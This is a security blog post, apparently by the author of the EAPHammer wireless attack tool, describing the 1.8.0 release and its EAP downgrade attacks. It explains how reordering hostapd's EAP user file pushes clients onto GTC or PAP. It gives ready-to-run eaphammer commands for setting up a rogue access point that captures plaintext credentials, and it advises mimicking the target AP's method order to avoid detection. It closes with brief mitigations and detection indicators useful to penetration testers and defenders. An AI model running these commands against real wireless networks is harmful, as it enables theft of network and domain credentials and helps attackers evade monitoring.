---
layout: post
title: EAPHammer Version 1.8.0 - EAP downgrade attacks
categories:
- wireless
- eaphammer
---

EAPHammer version 0.9.0 was released back in June 2019, and introduced the ability to execute both GTC and generic EAP downgrade attacks. Due to issues that were uncovered during field testing (see `Controlling EAP negotiation with EAPHammer`), the implementation of these attacks has been almost completely overhauled in version 1.8.0.

In this blog post we'll discuss each of the following topics:

- Prerequisite theory and background information
	- EAP negotiation (theory and implementation)
	- Generic EAP downgrade attacks
	- GTC downgrade attacks 
- How EAPHammer handles EAP negotiation (as of version 1.8.0)
- Attack methodologies
- Migitations
- Monitoring for EAP downgrade attacks

Please note that the section on detection and monitoring is limited to a high level overview, since it is a topic that warrants a dedicated post of its own.

- [https://github.com/s0lst1c3/eaphammer/releases/tag/v1.8.0](https://github.com/s0lst1c3/eaphammer/releases/tag/v1.8.0)

# Background

## EAP negotiation and hostapd's EAP user file

Before diving into EAP downgrade attacks, we first need to cover some prerequisite information:

- How EAP negotiation works
- How EAP negotiation and accounting are implemented by hostapd

Let's begin with a brief overview of the EAP negotiation process. EAP is really more of a framework than a specific authentication mechanism. It provides a standardized set of functions and rules that dictate how authentication should take place, and leaves the specific details to individual implementations known as EAP Methods [1]. 

EAP itself is a four step process that consists of the following phases (optional steps have been omitted for brevity):

1. Initialization
2. Initiation
3. EAP negotiation
4. Authentication

EAP downgrade attacks are an abuse of the third phase in this list: EAP negotiation [1].

Hostapd maintains lists of supported EAP methods for each user that is allowed to authenticate with the network. These lists can be found in hostapd's EAP User file, which is essentially a database implemented using a text file. All user account information is stored in this file, and each line of the file corresponds to a specific account [2][3][4]. 

Each line in the EAP User file contains the following attributes:

- The user's identity
- The list of EAP methods that the user is permitted to use
- The user's password (optional for Phase 1 entries)

_Note: an NT password hash can be used in leui of a password if MSCHAP or MSCHAPv2 are used for authentication. The NT password hash is the 16-byte MD4 hash of the unicode representation of the password [2]._

![eap negotiation with hostapd](/images/eap-negotiation/eap-user-file-diagram.gif)

When a user initiates the EAP authentication process with hostapd, hostapd searches line by line for the user's identity in the EAP User file [2][3][4]. When a matching line is found, hostapd iterates through the user's list of permitted EAP methods from left to right. At each iteration, hostapd suggests the currently selected EAP method to the client device (supplicant). The client device can either accept or deny the suggestion. Should the client device accept the suggestion, the client and authentication server transition from the EAP negotiation phase to the Authentication phase. Otherwise, hostapd will continue to propose EAP methods until the client agrees to one of them, or the list of allowed EAP methods is exhausted. In the latter case, authentication will fail [1][2][4].

## EAP downgrade attacks

To reduce the potential for device incompatibility issues resulting from failed negotiation attempts, both supplicants and authentication servers are typically configured to support a variety of EAP Methods. However, not all EAP methods are created equal.

Most EAP methods have some flaws that can be abused by an attacker to capture hashes, and the least secure methods can be abused to capture plaintext credentials [8]. Because of this, authentication servers (including hostapd) typically propose EAP methods from strongest to weakest during the EAP negotiation process [2]. This ensures that the supplicant selects the strongest EAP method that it can support.

For example, to configure hostapd to suggest EAP methods from strongest to weakest for a specific account, we'd edit the relevent entry in the EAP User file to look like this:

	wifimcwififace MSCHAPV2,TTLS-MSCHAPV2,TTLS-MSCHAP,TTLS,TTLS-CHAP,MD5,GTC,TTLS-PAP "wattapassw0rd" [2]

_Note: the `[2]` in the snippet shown above is not a citation. It's syntax from the EAP User file. This holds true for any additional EAP User file snippets that appear in this post._

To execute an EAP downgrade attack, we use a patched version of  hostapd that accepts arbitrary authentication attempts (WPE functionality) and reverse the order of the allowed EAP methods in this file. This causes hostapd to suggest EAP methods from weakest to strongest during the EAP negotiation process:

	# note that hostapd with WPE patch will overwrite the user's identity with `t`, which means that
	# this user entry will always be used
	t GTC,TTLS-PAP,MD5,TTLS-CHAP,TTLS-MSCHAP,MSCHAPV2,TTLS-MSCHAPV2,TTLS "t" [2]

If we're lucky, we'll be able to grab plaintext credentails from clients that support EAP-GTC or TTLS-PAP.

### GTC downgrade attacks

GTC downgrade attacks were first discovered by Josh Hoover ([@wishbone1138](https://twitter.com/wishbone1138)) and James Snodgrass ([@PuNk1nPo0p](https://twitter.com/PuNk1nPo0p)) in 2013, and are a variation of the EAP downgrade attack that can be used to obtain plaintext credentials from supplicants that support EAP-GTC [5]. 

EAP-GTC is an EAP method created by Microsoft and Cisco to support the use of hardware tokens and one-time passwords with EAP-PEAP [7]. Its implementation is similar to MSCHAPv2, but does not use a peer challenge. Instead, passwords are sent to the access point in plaintext [5]. 

In an EAP downgrade attack, we tell hostapd to use an EAP User file that looks similar to the one shown below (credit goes to Adam Toscher ([@W00Tock](https://twitter.com/W00Tock)) for this specific implementation)[6]:

	* PEAP [ver=1]
	"t" GTC "t" [2]

This causes hostapd to explicity suggest EAP-GTC during the EAP negotiation process. If the client accepts the suggestion, it will either prompt the user for a one-time password or transmit a plaintext password to hostapd automatically [9]. Since many client devices fail to specify what kind of password they are prompting for, the users are likely to believe that they are being prompted for their network logon credentials [9]. You can imagine the implications of this attack in environments where Active Directory accounts are used for RADIUS authentication.

# Controlling EAP negotiation with EAPHammer

The problem with this approach is that proposing EAP methods from strongest to weakest slows down the EAP negotiation process, since many client devices won't accept the first few EAP methods suggested by hostapd. Protracted EAP negotiation can result in a noticable loss of service for affected client devices, and anecdotally may cause devices to disconnect from the rogue AP (possibly due to manual intervention by frustrated users). Also anecdotally, this tends to occur frequently in situations where it's already difficult to force a device to connect the rogue AP.

To deal with this issue, EAPHammer version 1.8.0 introduces a number of options for controlling the EAP negotiation process:

## Balanced approach (default)

EAPHammer's default bevahior is to suggest the following sequences of EAP methods during EAP negotiation:

	# Phase 1 (outer authentication)
	PEAP,TTLS,TLS,FAST

	# Phase 2  (inner authentication)
	GTC,MSCHAPV2,TTLS-MSCHAPV2,TTLS,TTLS-CHAP,TTLS-PAP,TTLS-MSCHAP,MD5

EAPHammer first attempts a GTC downgrade attack, and then immediately falls back to stronger EAP methods if the attempt fails. This balanced approach is designed to maximize impact while minimizing the risk of protracted EAP negotiations. 

To execute this attack, run EAPHammer with the `--negotiate balanced` flag:

```bash
./eaphammer --interface wlan0 \
	--negotiate balanced \
	--auth wpa-eap \
	--essid example \
	--creds
```

Alternatively, just omit the `--negotiate` flag altogether:

```bash
./eaphammer --interface wlan0 \
	--auth wpa-eap \
	--essid example \
	--creds
```

## Full EAP downgrade (weakest to strongest)

Should you want to perform a full EAP downgrade attack, you can do so using the `--negotiate weakest` flag:

```bash
./eaphammer --interface wlan0 \
	--negotiate weakest \
	--auth wpa-eap \
	--essid example \
	--creds
```

This will instruct EAPHammer to suggest the following sequences of EAP methods during EAP negotiation:

	# Phase 1 (outer authentication)
	PEAP,TTLS,TLS,FAST

	# Phase 2 (inner authentication)
	GTC,TTLS-PAP,MD5,TTLS-CHAP,TTLS-MSCHAP,MSCHAPV2,TTLS-MSCHAPV2,TTLS

Keep in mind that using this option may lead to long EAP negotiation times.

## Speed optimized approach (strongest to weakest)

In this mode, EAPHammer proposes the EAP methods that are most likely to succeed first:

```bash
./eaphammer --interface wlan0 \
	--negotiate speed \
	--auth wpa-eap \
	--essid example \
	--creds
```

This will instruct EAPHammer to suggest the following sequences of EAP methods during EAP negotiation:

	# Phase 1 (outer authentication)
	PEAP,TTLS,TLS,FAST

	# Phase 2 (inner authentication)
	MSCHAPV2,TTLS-MSCHAPV2,TTLS,TTLS-CHAP,GTC,TTLS-PAP,TTLS-MSCHAP,MD5

Use this mode if you have trouble getting clients to finish the EAP authentication process using the default mode.

## Explicit GTC downgrade

To execute [@W00Tock](https://twitter.com/W00Tock)'s highly efficient GTC downgrade implementation, use the `--negotiate gtc-downgrade` flag:

```bash
./eaphammer --interface wlan0 \
	--negotiate gtc-downgrade \
	--auth wpa-eap \
	--essid example \
	--creds
```

## Manual command line configuration

To manually control which EAP methods are used by EAPHammer, as well as the order in which they are suggested to the client, use the `--negotiate manual` flag in conjuction with the `--phase-2-methods` and `--phase-1-methods` flags:

```bash
./eaphammer --interface wlan0 \
	--negotiate manual \
	--phase-1-methods PEAP,TTLS \
	--phase-2-methods MSCHAPV2,GTC,TTLS-MSCHAP \
	--auth wpa-eap \
	--essid example \
	--creds
```

Manual control over the EAP negotiation process is useful in situations where the access point's behavior must be mimicked in order to evade detection.

## Manual config files

To use your own EAP User file, instead of relying on EAPHammer's automated processes, run EAPHammer with the `--eap-user-file` flag:

```bash
./eaphammer --interface wlan0 \
	--eap-user-file /tmp/i-like-to-write-things-by-hand.eap_user \
	--auth wpa-eap \
	--essid painful \
	--creds
```

# Recommended attack methodology

In scenarios where stealth doesn't matter, use the `--negotiate gtc-downgrade` flag to lead with [@W00Tock](https://twitter.com/W00Tock)'s attack, then perform a second round of attacks using the `--negotiate speed` flag.

If you care about not getting caught, and are confident that your opponent monitors for these sorts of attacks, use the `--negotiate manual` flag to mimick the EAP method load order of the target access point.

# Mitigations

To mitigate this attack, disable support for insecure EAP methods such as EAP-GTC and EAP-PAP. It's best to do so consistently across all devices using Group Policy, an MDM solution, or any other means of managing devices in a centralized way. Using EAP-TLS is considered an industry best practice, since it uses mutual certificate-based authentication, but choosing EAP methods can be a nuanced topic that's best left to its own blog psot. 

# Monitoring for EAP downgrade attacks

As mentioned in the introduction, this section is going to be very brief, since this is a topic that is better suited for a dedicated blog post.

We can detect the use of EAP downgrade attacks by alerting on either of the following two indicators:

- During negotiation, an access point suggests an EAP method that our infrastructure does not support
- During negotiation, an access point suggests EAP methods in a different order than the sequence used by our own infrastructure

These indicators can be observed by monitoring event logs on wireless endpoints.

It's important to note that these detection techniques will fail if the attacker is able to mimick the order in which the legitimate access point suggests EAP methods, and avoids using EAP methods that are not supported by the target infrastructure.

# References

[1] https://tools.ietf.org/html/rfc3748  
[2] https://w1.fi/cgit/hostap/plain/hostapd/hostapd.eap_user  
[3] https://w1.fi/cgit/hostap/plain/hostapd/README  
[4] https://w1.fi/cgit/hostap/tree/src/eap_server  
[5] https://www.youtube.com/watch?v=-uqTqJwTFyU&feature=youtu.be&t=22m34s  
[6] https://twitter.com/w00tock/status/1019251419310972930  
[7] https://tools.ietf.org/id/draft-sheffer-ipsecme-ikev2-gtc-01.html  
[8] https://github.com/sensepost/hostapd-mana/wiki/EAP-WPE-Attack-Theory  
[9] https://foxglovesecurity.com/2016/02/24/when-whales-fly-building-a-wireless-pentest-environment-using-docker/  
